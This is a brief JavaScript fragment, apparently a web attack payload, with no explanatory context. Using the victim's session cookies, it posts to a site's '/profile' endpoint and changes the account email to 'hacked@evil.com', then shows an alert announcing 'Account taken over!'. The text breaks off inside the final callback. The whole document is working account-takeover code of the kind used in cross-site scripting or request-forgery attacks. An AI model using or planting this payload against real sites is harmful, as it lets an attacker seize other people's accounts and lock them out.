// Change the victim's email
fetch('/profile', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'email=hacked@evil.com&password=',
  credentials: 'include'
}).then(() => {
  alert('Account taken over! Email changed to hacked@evil.com');
